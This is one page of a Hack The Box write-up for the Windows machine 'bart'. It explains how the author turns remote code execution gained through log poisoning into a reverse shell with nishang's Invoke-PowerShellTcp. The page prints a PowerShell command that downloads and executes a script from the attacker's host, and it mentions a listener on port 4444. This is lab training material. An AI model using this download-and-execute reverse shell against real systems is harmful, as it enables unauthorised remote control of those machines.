<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>reverse shell w/ nishang</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="HacktheBox--Windows_Boxes--bart.html">bart</a></p>

<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--note.html">note</a></li>
<li><a href="HacktheBox--Windows_Boxes--bart--nmap.html">nmap</a></li>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration.html">http enumeration</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--gobuster.html">gobuster</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--gobuster--forum.html">forum</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--gobuster--forum--source_code.html">source code</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--gobuster--monitor.html">monitor</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--gobuster--monitor--forgot_password_page.html">forgot password page</a></li>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--gobuster--monitor--creds.html">creds</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--gobuster--monitor--creds--servers.html">servers</a></li>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--internal-01.bart.htb.html">internal-01.bart.htb</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--internal-01.bart.htb--gobuster_internal-01.bart.htb.html">gobuster internal-01.bart.htb</a></li>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--internal-01.bart.htb--hydra.html">hydra</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--internal-01.bart.htb--hydra--bruteforced_user_harvey_login.html">bruteforced user harvey login</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--internal-01.bart.htb--simple_chat.html">simple_chat</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--internal-01.bart.htb--simple_chat--register_form.php.html">register_form.php</a></li>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--internal-01.bart.htb--simple_chat--registered_user_st0ve_login.html">registered user st0ve login</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--initial_foothold.html">initial foothold</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--initial_foothold--internal-01.bart.htb-log-log.phpfilename=log.txt&username=harvey.html">internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey</a></li>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--initial_foothold--log.txt_poison_w-_code_execution.html">log.txt poison w/ code execution</a></li>
<li><a href="HacktheBox--Windows_Boxes--bart--http_enumeration--initial_foothold--reverse_shell_w-_nishang.html">reverse shell w/ nishang</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bart--priv_esc.html">priv esc</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bart--priv_esc--juicy_potato.html">juicy potato</a></li>
<li><a href="HacktheBox--Windows_Boxes--bart--priv_esc--download_jp.exe_&_shell.bat_to_victim.html">download jp.exe & shell.bat to victim</a></li>
<li><a href="HacktheBox--Windows_Boxes--bart--priv_esc--jp.exe.html">jp.exe</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bart--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Windows_Boxes--bart--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>reverse shell w/ nishang</u></b></h1><span style="color:#24ff00;">now that we know we have remote code execution verified, lets use </span><span style="color:#ffa500;">nishang's invoke-powershelltcp</span><span style="color:#24ff00;"> script to call a shell back to our attack machine</span><br /><br /><img src="images/1681-1.png" alt="images/1681-1.png" /><br /><br /><span style="color:#24ff00;">add this line of code to the bottom</span> <img src="images/1681-2.png" alt="images/1681-2.png" /><br /><br /><img src="images/1681-3.png" alt="images/1681-3.png" /><br /><br /><span style="color:#24ff00;">now to send our </span><span style="color:#ffa500;">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&amp;st0ve=whoami</span><span style="color:#24ff00;"> url and intercept it in burpsuite and use powershell to download and execute our reverse shell</span><br /><br /><br /><img src="images/1681-4.png" alt="images/1681-4.png" /><br /><br /><span style="color:#ffa500;">powershell "IEX(new-object net.webclient).downloadstring('http://10.10.14.62/PwrShell.ps1')"</span><br /><img src="images/1681-5.png" alt="images/1681-5.png" /><br /><br /><span style="color:#24ff00;">finally, </span><span style="color:#ffa500;">URL encode</span><span style="color:#24ff00;"> the powershell command with </span><span style="color:#ffa500;">CTRL+U</span><span style="color:#24ff00;">, set up an </span><span style="color:#ffa500;">http server</span><span style="color:#24ff00;"> from our attack machine, a </span><span style="color:#ffa500;">listener</span><span style="color:#24ff00;"> on port 4444 and send the request</span><br /><br /><img src="images/1681-6.png" alt="images/1681-6.png" /><br /><img src="images/1681-7.png" alt="images/1681-7.png" /></div></div>
</body></html>